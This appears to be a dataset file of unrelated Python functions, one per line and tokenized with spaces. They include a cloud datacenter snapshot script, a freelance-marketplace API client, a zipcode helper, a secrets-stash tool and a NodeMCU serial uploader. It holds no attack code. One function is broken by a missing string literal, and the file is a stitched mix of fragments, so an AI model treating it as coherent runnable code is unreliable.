def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program_name = os . path . basename ( sys . argv [ 0 ] ) program_version = "v%s" % __version__ program_build_date = str ( __updated__ ) program_version_message = '%%(prog)s %s (%s)' % ( program_version , program_build_date ) program_shortdesc = __import__ ( '__main__' ) . __doc__ . split ( "\n" ) [ 1 ] program_license = % ( program_shortdesc , str ( __date__ ) ) try : # Setup argument parser parser = ArgumentParser ( description = program_license , formatter_class = RawDescriptionHelpFormatter ) parser . add_argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add_argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add_argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add_argument ( '-d' , '--datacenterid' , dest = 'dc_id' , required = True , default = None , help = 'datacenter ID of the server' ) parser . add_argument ( '-o' , '--outfile' , dest = 'outfile' , default = 'dc-def_' + datetime . now ( ) . strftime ( '%Y-%m-%d_%H%M%S' ) , help = 'the output file name' ) parser . add_argument ( '-S' , '--Stopalways' , dest = 'stopalways' , action = 'store_true' , help = 'power off even when VM is running' ) parser . add_argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add_argument ( '-V' , '--version' , action = 'version' , version = program_version_message ) # Process arguments args = parser . parse_args ( ) global verbose verbose = args . verbose if verbose > 0 : print ( "Verbose mode on" ) print ( "start {} with args {}" . format ( program_name , str ( args ) ) ) outfile = args . outfile if outfile . endswith ( ".json" ) : outfile = os . path . splitext ( outfile ) print ( "Using output file base name '{}'" . format ( outfile ) ) ( user , password ) = getLogin ( args . loginfile , args . user , args . password ) if user is None or password is None : raise ValueError ( "user or password resolved to None" ) pbclient = ProfitBricksService ( user , password ) dc_id = args . dc_id # first get all server's VM and OS state to see if we can start srv_info = getServerInfo ( pbclient , dc_id ) srvon = 0 for server in srv_info : if server [ 'vmstate' ] != 'SHUTOFF' : print ( "VM {} is in state {}, but should be SHUTOFF" . format ( server [ 'name' ] , server [ 'vmstate' ] ) ) srvon += 1 # end for(srv_info) if srvon > 0 and not args . stopalways : print ( "shutdown running OS before trying again" ) return 1 # now power off all VMs before starting the snapshots for server in srv_info : controlServerState ( pbclient , dc_id , server [ 'id' ] , action = 'POWEROFF' ) # now let's go dcdef = pbclient . get_datacenter ( dc_id , 5 ) print ( "starting dump of datacenter {}" . format ( dcdef [ 'properties' ] [ 'name' ] ) ) dcdef_file = outfile + '_source.json' print ( "write source dc to {}" . format ( dcdef_file ) ) write_dc_definition ( dcdef , dcdef_file ) print ( "get existing Snapshots" ) # first get existing snapshots known_snapshots = dict ( ) snapshots = pbclient . list_snapshots ( ) for snap in snapshots [ 'items' ] : print ( "SNAP : {}" . format ( json . dumps ( snap ) ) ) known_snapshots [ snap [ 'properties' ] [ 'name' ] ] = snap [ 'id' ] print ( "create Snapshots, this may take a while .." ) # we do NOT consider dangling volumes, only server-attached ones vol_snapshots = dict ( ) # map volume id==snapshot name snapshot id for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'volumes' not in server [ 'entities' ] : print ( " server {} has no volumes" . format ( server [ 'properties' ] [ 'name' ] ) ) continue # The volumes are attached by order of creation # Thus we must sort them to keep the order in the clone print ( "setting volume order by deviceNumber" ) volumes = server [ 'entities' ] [ 'volumes' ] [ 'items' ] new_order = sorted ( volumes , key = lambda vol : vol [ 'properties' ] [ 'deviceNumber' ] ) server [ 'entities' ] [ 'volumes' ] [ 'items' ] = new_order for volume in server [ 'entities' ] [ 'volumes' ] [ 'items' ] : vol_id = volume [ 'id' ] # this will be the name too if vol_id in known_snapshots : print ( "use existing snapshot {} of volume {}" . format ( vol_id , volume [ 'properties' ] [ 'name' ] ) ) vol_snapshots [ vol_id ] = known_snapshots [ vol_id ] else : print ( "taking snapshot {} of volume {}" . format ( vol_id , volume [ 'properties' ] [ 'name' ] ) ) response = pbclient . create_snapshot ( dc_id , vol_id , vol_id , "auto-created by pb_snapshotDatacenter" ) # response has no request id, need to check metadata state (BUSY, AVAILABLE..) vol_snapshots [ vol_id ] = response [ 'id' ] print ( "snapshot in progress: {}" . format ( str ( response ) ) ) # end for(volume) # end for(server) print ( "Waiting for snapshots to complete" ) snapdone = dict ( ) while len ( snapdone ) != len ( vol_snapshots ) : sleep ( 10 ) for snap_id in vol_snapshots . values ( ) : print ( "looking for {}" . format ( snap_id ) ) if snap_id in snapdone : continue snapshot = pbclient . get_snapshot ( snap_id ) print ( "snapshot {} is in state {}" . format ( snap_id , snapshot [ 'metadata' ] [ 'state' ] ) ) if snapshot [ 'metadata' ] [ 'state' ] == 'AVAILABLE' : snapdone [ snap_id ] = snapshot [ 'metadata' ] [ 'state' ] # end for(vol_snapshots) # end while(snapdone) # now replace the volumes image IDs print ( "setting snapshot id to volumes" ) for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'volumes' not in server [ 'entities' ] : print ( " server {} has no volumes" . format ( server [ 'properties' ] [ 'name' ] ) ) continue for volume in server [ 'entities' ] [ 'volumes' ] [ 'items' ] : vol_id = volume [ 'id' ] # this will be the name too volume [ 'properties' ] [ 'image' ] = vol_snapshots [ vol_id ] # end for(volume) # end for(server) # As it came out, the LAN id is rearranged by order of creation # Thus we must sort the LANs to keep the order in the clone print ( "setting LAN order by id" ) lans = dcdef [ 'entities' ] [ 'lans' ] [ 'items' ] new_order = sorted ( lans , key = lambda lan : lan [ 'id' ] ) dcdef [ 'entities' ] [ 'lans' ] [ 'items' ] = new_order # now sort unordered NICs by MAC and save the dcdef # reason is, that NICs seem to be ordered by MAC, but API response # doesn't guarantee the order, which we need for re-creation print ( "setting NIC order by MAC" ) for server in dcdef [ 'entities' ] [ 'servers' ] [ 'items' ] : print ( "- server {}" . format ( server [ 'properties' ] [ 'name' ] ) ) if 'nics' not in server [ 'entities' ] : print ( " server {} has no nics" . format ( server [ 'properties' ] [ 'name' ] ) ) continue nics = server [ 'entities' ] [ 'nics' ] [ 'items' ] # print("NICs before {}".format(json.dumps(nics))) new_order = sorted ( nics , key = lambda nic : nic [ 'properties' ] [ 'mac' ] ) # print("NICs after {}".format(json.dumps(new_order))) server [ 'entities' ] [ 'nics' ] [ 'items' ] = new_order # end for(server) dcdef_file = outfile + '.json' print ( "write snapshot dc to {}" . format ( dcdef_file ) ) write_dc_definition ( dcdef , dcdef_file ) return 0 except KeyboardInterrupt : # handle keyboard interrupt return 0 except Exception : traceback . print_exc ( ) sys . stderr . write ( "\n" + program_name + ":  for help use --help\n" ) return 2
def get_self ( session , user_details = None ) : # Set compact to true if user_details : user_details [ 'compact' ] = True response = make_get_request ( session , 'self' , params_data = user_details ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise SelfNotRetrievedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_user_by_id ( session , user_id , user_details = None ) : if user_details : user_details [ 'compact' ] = True response = make_get_request ( session , 'users/{}' . format ( user_id ) , params_data = user_details ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise UserNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_self_user_id ( session ) : response = make_get_request ( session , 'self' ) if response . status_code == 200 : return response . json ( ) [ 'result' ] [ 'id' ] else : raise UserIdNotRetrievedException ( 'Error retrieving user id: %s' % response . text , response . text )
def add_user_jobs ( session , job_ids ) : jobs_data = { 'jobs[]' : job_ids } response = make_post_request ( session , 'self/jobs' , json_data = jobs_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise UserJobsNotAddedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def delete_user_jobs ( session , job_ids ) : jobs_data = { 'jobs[]' : job_ids } response = make_delete_request ( session , 'self/jobs' , json_data = jobs_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise UserJobsNotDeletedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_users ( session , query ) : # GET /api/users/0.1/users response = make_get_request ( session , 'users' , params_data = query ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise UsersNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def create_hireme_project ( session , title , description , currency , budget , jobs , hireme_initial_bid ) : jobs . append ( create_job_object ( id = 417 ) ) # Hire Me job, required project_data = { 'title' : title , 'description' : description , 'currency' : currency , 'budget' : budget , 'jobs' : jobs , 'hireme' : True , 'hireme_initial_bid' : hireme_initial_bid } # POST /api/projects/0.1/projects/ response = make_post_request ( session , 'projects' , json_data = project_data ) json_data = response . json ( ) if response . status_code == 200 : project_data = json_data [ 'result' ] p = Project ( project_data ) p . url = urljoin ( session . url , 'projects/%s' % p . seo_url ) return p else : raise ProjectNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] , )
def get_projects ( session , query ) : # GET /api/projects/0.1/projects response = make_get_request ( session , 'projects' , params_data = query ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise ProjectsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_project_by_id ( session , project_id , project_details = None , user_details = None ) : # GET /api/projects/0.1/projects/<int:project_id> query = { } if project_details : query . update ( project_details ) if user_details : query . update ( user_details ) response = make_get_request ( session , 'projects/{}' . format ( project_id ) , params_data = query ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise ProjectsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def search_projects ( session , query , search_filter = None , project_details = None , user_details = None , limit = 10 , offset = 0 , active_only = None ) : search_data = { 'query' : query , 'limit' : limit , 'offset' : offset , } if search_filter : search_data . update ( search_filter ) if project_details : search_data . update ( project_details ) if user_details : search_data . update ( user_details ) # GET /api/projects/0.1/projects/all/ # GET /api/projects/0.1/projects/active/ endpoint = 'projects/{}' . format ( 'active' if active_only else 'all' ) response = make_get_request ( session , endpoint , params_data = search_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise ProjectsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def place_project_bid ( session , project_id , bidder_id , description , amount , period , milestone_percentage ) : bid_data = { 'project_id' : project_id , 'bidder_id' : bidder_id , 'description' : description , 'amount' : amount , 'period' : period , 'milestone_percentage' : milestone_percentage , } # POST /api/projects/0.1/bids/ response = make_post_request ( session , 'bids' , json_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : bid_data = json_data [ 'result' ] return Bid ( bid_data ) else : raise BidNotPlacedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_bids ( session , project_ids = [ ] , bid_ids = [ ] , limit = 10 , offset = 0 ) : get_bids_data = { } if bid_ids : get_bids_data [ 'bids[]' ] = bid_ids if project_ids : get_bids_data [ 'projects[]' ] = project_ids get_bids_data [ 'limit' ] = limit get_bids_data [ 'offset' ] = offset # GET /api/projects/0.1/bids/ response = make_get_request ( session , 'bids' , params_data = get_bids_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise BidsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_milestones ( session , project_ids = [ ] , milestone_ids = [ ] , user_details = None , limit = 10 , offset = 0 ) : get_milestones_data = { } if milestone_ids : get_milestones_data [ 'milestones[]' ] = milestone_ids if project_ids : get_milestones_data [ 'projects[]' ] = project_ids get_milestones_data [ 'limit' ] = limit get_milestones_data [ 'offset' ] = offset # Add projections if they exist if user_details : get_milestones_data . update ( user_details ) # GET /api/projects/0.1/milestones/ response = make_get_request ( session , 'milestones' , params_data = get_milestones_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise MilestonesNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_milestone_by_id ( session , milestone_id , user_details = None ) : # GET /api/projects/0.1/milestones/{milestone_id}/ endpoint = 'milestones/{}' . format ( milestone_id ) response = make_get_request ( session , endpoint , params_data = user_details ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise MilestonesNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def award_project_bid ( session , bid_id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid_data = { 'action' : 'award' } # POST /api/projects/0.1/bids/{bid_id}/?action=award endpoint = 'bids/{}' . format ( bid_id ) response = make_put_request ( session , endpoint , headers = headers , params_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : json_data = response . json ( ) raise BidNotAwardedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def revoke_project_bid ( session , bid_id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid_data = { 'action' : 'revoke' } # POST /api/projects/0.1/bids/{bid_id}/?action=revoke endpoint = 'bids/{}' . format ( bid_id ) response = make_put_request ( session , endpoint , headers = headers , params_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : json_data = response . json ( ) raise BidNotRevokedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def accept_project_bid ( session , bid_id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid_data = { 'action' : 'accept' } # POST /api/projects/0.1/bids/{bid_id}/?action=revoke endpoint = 'bids/{}' . format ( bid_id ) response = make_put_request ( session , endpoint , headers = headers , params_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : json_data = response . json ( ) raise BidNotAcceptedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def retract_project_bid ( session , bid_id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid_data = { 'action' : 'retract' } # POST /api/projects/0.1/bids/{bid_id}/?action=revoke endpoint = 'bids/{}' . format ( bid_id ) response = make_put_request ( session , endpoint , headers = headers , params_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : json_data = response . json ( ) raise BidNotRetractedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def highlight_project_bid ( session , bid_id ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } bid_data = { 'action' : 'highlight' } # POST /api/projects/0.1/bids/{bid_id}/?action=revoke endpoint = 'bids/{}' . format ( bid_id ) response = make_put_request ( session , endpoint , headers = headers , params_data = bid_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : json_data = response . json ( ) raise BidNotHighlightedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def create_milestone_payment ( session , project_id , bidder_id , amount , reason , description ) : milestone_data = { 'project_id' : project_id , 'bidder_id' : bidder_id , 'amount' : amount , 'reason' : reason , 'description' : description } # POST /api/projects/0.1/milestones/ response = make_post_request ( session , 'milestones' , json_data = milestone_data ) json_data = response . json ( ) if response . status_code == 200 : milestone_data = json_data [ 'result' ] return Milestone ( milestone_data ) else : raise MilestoneNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def post_track ( session , user_id , project_id , latitude , longitude ) : tracking_data = { 'user_id' : user_id , 'project_id' : project_id , 'track_point' : { 'latitude' : latitude , 'longitude' : longitude } } # POST /api/projects/0.1/tracks/ response = make_post_request ( session , 'tracks' , json_data = tracking_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise TrackNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_track_by_id ( session , track_id , track_point_limit = None , track_point_offset = None ) : tracking_data = { } if track_point_limit : tracking_data [ 'track_point_limit' ] = track_point_limit if track_point_offset : tracking_data [ 'track_point_offset' ] = track_point_offset # GET /api/projects/0.1/tracks/{track_id}/ response = make_get_request ( session , 'tracks/{}' . format ( track_id ) , params_data = tracking_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise TrackNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def release_milestone_payment ( session , milestone_id , amount ) : params_data = { 'action' : 'release' , } milestone_data = { 'amount' : amount , } # PUT /api/projects/0.1/milestones/{milestone_id}/?action=release endpoint = 'milestones/{}' . format ( milestone_id ) response = make_put_request ( session , endpoint , params_data = params_data , json_data = milestone_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneNotReleasedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def request_release_milestone_payment ( session , milestone_id ) : params_data = { 'action' : 'request_release' , } # PUT /api/projects/0.1/milestones/{milestone_id}/?action=release endpoint = 'milestones/{}' . format ( milestone_id ) response = make_put_request ( session , endpoint , params_data = params_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneNotRequestedReleaseException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def cancel_milestone_payment ( session , milestone_id ) : params_data = { 'action' : 'cancel' , } # PUT /api/projects/0.1/milestones/{milestone_id}/?action=release endpoint = 'milestones/{}' . format ( milestone_id ) response = make_put_request ( session , endpoint , params_data = params_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneNotCancelledException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def create_milestone_request ( session , project_id , bid_id , description , amount ) : milestone_request_data = { 'project_id' : project_id , 'bid_id' : bid_id , 'description' : description , 'amount' : amount , } # POST /api/projects/0.1/milestone_requests/ response = make_post_request ( session , 'milestone_requests' , json_data = milestone_request_data ) json_data = response . json ( ) if response . status_code == 200 : milestone_request_data = json_data [ 'result' ] return MilestoneRequest ( milestone_request_data ) else : raise MilestoneRequestNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def accept_milestone_request ( session , milestone_request_id ) : params_data = { 'action' : 'accept' , } # POST /api/projects/0.1/milestone_requests/{milestone_request_id}/?action= # accept endpoint = 'milestone_requests/{}' . format ( milestone_request_id ) response = make_put_request ( session , endpoint , params_data = params_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneRequestNotAcceptedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def reject_milestone_request ( session , milestone_request_id ) : params_data = { 'action' : 'reject' , } # POST /api/projects/0.1/milestone_requests/{milestone_request_id}/?action= # reject endpoint = 'milestone_requests/{}' . format ( milestone_request_id ) response = make_put_request ( session , endpoint , params_data = params_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneRequestNotRejectedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def delete_milestone_request ( session , milestone_request_id ) : params_data = { 'action' : 'delete' , } # POST /api/projects/0.1/milestone_requests/{milestone_request_id}/?action= # delete endpoint = 'milestone_requests/{}' . format ( milestone_request_id ) response = make_put_request ( session , endpoint , params_data = params_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'status' ] else : raise MilestoneRequestNotDeletedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_jobs ( session , job_ids , seo_details , lang ) : get_jobs_data = { 'jobs[]' : job_ids , 'seo_details' : seo_details , 'lang' : lang , } # GET /api/projects/0.1/jobs/ response = make_get_request ( session , 'jobs' , params_data = get_jobs_data ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise JobsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def create_project_thread ( session , member_ids , project_id , message ) : return create_thread ( session , member_ids , 'project' , project_id , message )
def post_message ( session , thread_id , message ) : headers = { 'Content-Type' : 'application/x-www-form-urlencoded' } message_data = { 'message' : message , } # POST /api/messages/0.1/threads/{thread_id}/messages/ endpoint = 'threads/{}/messages' . format ( thread_id ) response = make_post_request ( session , endpoint , headers , form_data = message_data ) json_data = response . json ( ) if response . status_code == 200 : return Message ( json_data [ 'result' ] ) else : raise MessageNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def post_attachment ( session , thread_id , attachments ) : files = [ ] filenames = [ ] for attachment in attachments : files . append ( attachment [ 'file' ] ) filenames . append ( attachment [ 'filename' ] ) message_data = { 'attachments[]' : filenames , } # POST /api/messages/0.1/threads/{thread_id}/messages/ endpoint = 'threads/{}/messages' . format ( thread_id ) response = make_post_request ( session , endpoint , form_data = message_data , files = files ) json_data = response . json ( ) if response . status_code == 200 : return Message ( json_data [ 'result' ] ) else : raise MessageNotCreatedException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_messages ( session , query , limit = 10 , offset = 0 ) : query [ 'limit' ] = limit query [ 'offset' ] = offset # GET /api/messages/0.1/messages response = make_get_request ( session , 'messages' , params_data = query ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise MessagesNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def get_threads ( session , query ) : # GET /api/messages/0.1/threads response = make_get_request ( session , 'threads' , params_data = query ) json_data = response . json ( ) if response . status_code == 200 : return json_data [ 'result' ] else : raise ThreadsNotFoundException ( message = json_data [ 'message' ] , error_code = json_data [ 'error_code' ] , request_id = json_data [ 'request_id' ] )
def _clean ( zipcode , valid_length = _valid_zipcode_length ) : zipcode = zipcode . split ( "-" ) [ 0 ] # Convert #####-#### to ##### if len ( zipcode ) != valid_length : raise ValueError ( 'Invalid format, zipcode must be of the format: "#####" or "#####-####"' ) if _contains_nondigits ( zipcode ) : raise ValueError ( 'Invalid characters, zipcode may only contain digits and "-".' ) return zipcode
def similar_to ( partial_zipcode , zips = _zips ) : return [ z for z in zips if z [ "zip_code" ] . startswith ( partial_zipcode ) ]
def filter_by ( zips = _zips , * * kwargs ) : return [ z for z in zips if all ( [ k in z and z [ k ] == v for k , v in kwargs . items ( ) ] ) ]
def is_valid_identifier ( name ) : if not isinstance ( name , str ) : return False if '\n' in name : return False if name . strip ( ) != name : return False try : code = compile ( '\n{0}=None' . format ( name ) , filename = '<string>' , mode = 'single' ) exec ( code ) return True except SyntaxError : return False
def _build_dict_from_key_value ( keys_and_values ) : key_dict = { } for key_value in keys_and_values : if '=' not in key_value : raise GhostError ( 'Pair {0} is not of `key=value` format' . format ( key_value ) ) key , value = key_value . split ( '=' , 1 ) key_dict . update ( { str ( key ) : str ( value ) } ) return key_dict
def purge_stash ( force , stash , passphrase , backend ) : stash = _get_stash ( backend , stash , passphrase ) try : click . echo ( 'Purging stash...' ) stash . purge ( force ) # Maybe we should verify that the list is empty # afterwards? click . echo ( 'Purge complete!' ) except GhostError as ex : sys . exit ( ex )
def export_keys ( output_path , stash , passphrase , backend ) : stash = _get_stash ( backend , stash , passphrase ) try : click . echo ( 'Exporting stash to {0}...' . format ( output_path ) ) stash . export ( output_path = output_path ) click . echo ( 'Export complete!' ) except GhostError as ex : sys . exit ( ex )
def get ( self , key_name , decrypt = True ) : self . _assert_valid_stash ( ) key = self . _storage . get ( key_name ) . copy ( ) if not key . get ( 'value' ) : return None if decrypt : key [ 'value' ] = self . _decrypt ( key [ 'value' ] ) audit ( storage = self . _storage . db_path , action = 'GET' , message = json . dumps ( dict ( key_name = key_name ) ) ) return key
def list ( self , key_name = None , max_suggestions = 100 , cutoff = 0.5 , locked_only = False , key_type = None ) : self . _assert_valid_stash ( ) key_list = [ k for k in self . _storage . list ( ) if k [ 'name' ] != 'stored_passphrase' and ( k . get ( 'lock' ) if locked_only else True ) ] if key_type : # To maintain backward compatibility with keys without a type. # The default key type is secret, in which case we also look for # keys with no (None) types. types = ( 'secret' , None ) if key_type == 'secret' else [ key_type ] key_list = [ k for k in key_list if k . get ( 'type' ) in types ] key_list = [ k [ 'name' ] for k in key_list ] if key_name : if key_name . startswith ( '~' ) : key_list = difflib . get_close_matches ( key_name . lstrip ( '~' ) , key_list , max_suggestions , cutoff ) else : key_list = [ k for k in key_list if key_name in k ] audit ( storage = self . _storage . db_path , action = 'LIST' + ( '[LOCKED]' if locked_only else '' ) , message = json . dumps ( dict ( ) ) ) return key_list
def delete ( self , key_name ) : self . _assert_valid_stash ( ) if key_name == 'stored_passphrase' : raise GhostError ( '`stored_passphrase` is a reserved ghost key name ' 'which cannot be deleted' ) # TODO: Optimize. We get from the storage twice here for no reason if not self . get ( key_name ) : raise GhostError ( 'Key `{0}` not found' . format ( key_name ) ) key = self . _storage . get ( key_name ) if key . get ( 'lock' ) : raise GhostError ( 'Key `{0}` is locked and therefore cannot be deleted ' 'Please unlock the key and try again' . format ( key_name ) ) deleted = self . _storage . delete ( key_name ) audit ( storage = self . _storage . db_path , action = 'DELETE' , message = json . dumps ( dict ( key_name = key_name ) ) ) if not deleted : raise GhostError ( 'Failed to delete {0}' . format ( key_name ) )
def purge ( self , force = False , key_type = None ) : self . _assert_valid_stash ( ) if not force : raise GhostError ( "The `force` flag must be provided to perform a stash purge. " "I mean, you don't really want to just delete everything " "without precautionary measures eh?" ) audit ( storage = self . _storage . db_path , action = 'PURGE' , message = json . dumps ( dict ( ) ) ) for key_name in self . list ( key_type = key_type ) : self . delete ( key_name )
def export ( self , output_path = None , decrypt = False ) : self . _assert_valid_stash ( ) all_keys = [ ] for key in self . list ( ) : # We `dict` this as a precaution as tinydb returns # a tinydb.database.Element instead of a dictionary # and well.. I ain't taking no chances all_keys . append ( dict ( self . get ( key , decrypt = decrypt ) ) ) if all_keys : if output_path : with open ( output_path , 'w' ) as output_file : output_file . write ( json . dumps ( all_keys , indent = 4 ) ) return all_keys else : raise GhostError ( 'There are no keys to export' )
def _decrypt ( self , hexified_value ) : encrypted_value = binascii . unhexlify ( hexified_value ) with warnings . catch_warnings ( ) : warnings . simplefilter ( "ignore" ) jsonified_value = self . cipher . decrypt ( encrypted_value ) . decode ( 'ascii' ) value = json . loads ( jsonified_value ) return value
def delete ( self , key_name ) : self . db . remove ( Query ( ) . name == key_name ) return self . get ( key_name ) == { }
def put ( self , key ) : self . _consul_request ( 'PUT' , self . _key_url ( key [ 'name' ] ) , json = key ) return key [ 'name' ]
def put ( self , key ) : self . client . write ( self . _key_path ( key [ 'name' ] ) , * * key ) return self . _key_path ( key [ 'name' ] )
def init ( self ) : # ignore 400 (IndexAlreadyExistsException) when creating an index self . es . indices . create ( index = self . params [ 'index' ] , ignore = 400 )
def init ( self ) : try : self . client . create_bucket ( Bucket = self . db_path , CreateBucketConfiguration = self . bucket_configuration ) except botocore . exceptions . ClientError as e : # If the bucket already exists if 'BucketAlreadyOwnedByYou' not in str ( e . response [ 'Error' ] [ 'Code' ] ) : raise e
def terminal ( port = default_port ( ) , baud = '9600' ) : testargs = [ 'nodemcu-uploader' , port , baud ] # TODO: modifying argv is no good sys . argv = testargs # resuse miniterm on main function miniterm . main ( )
def __set_baudrate ( self , baud ) : log . info ( 'Changing communication to %s baud' , baud ) self . __writeln ( UART_SETUP . format ( baud = baud ) ) # Wait for the string to be sent before switching baud time . sleep ( 0.1 ) try : self . _port . setBaudrate ( baud ) except AttributeError : #pySerial 2.7 self . _port . baudrate = baud
def set_timeout ( self , timeout ) : timeout = int ( timeout ) # will raise on Error self . _timeout = timeout == 0 and 999999 or timeout
def __clear_buffers ( self ) : try : self . _port . reset_input_buffer ( ) self . _port . reset_output_buffer ( ) except AttributeError : #pySerial 2.7 self . _port . flushInput ( ) self . _port . flushOutput ( )
def __expect ( self , exp = '> ' , timeout = None ) : timeout_before = self . _port . timeout timeout = timeout or self . _timeout #do NOT set timeout on Windows if SYSTEM != 'Windows' : # Checking for new data every 100us is fast enough if self . _port . timeout != MINIMAL_TIMEOUT : self . _port . timeout = MINIMAL_TIMEOUT end = time . time ( ) + timeout # Finish as soon as either exp matches or we run out of time (work like dump, but faster on success) data = '' while not data . endswith ( exp ) and time . time ( ) <= end : data += self . _port . read ( ) log . debug ( 'expect returned: `{0}`' . format ( data ) ) if time . time ( ) > end : raise CommunicationTimeout ( 'Timeout waiting for data' , data ) if not data . endswith ( exp ) and len ( exp ) > 0 : raise BadResponseException ( 'Bad response.' , exp , data ) if SYSTEM != 'Windows' : self . _port . timeout = timeout_before return data
def __exchange ( self , output , timeout = None ) : self . __writeln ( output ) self . _port . flush ( ) return self . __expect ( timeout = timeout or self . _timeout )
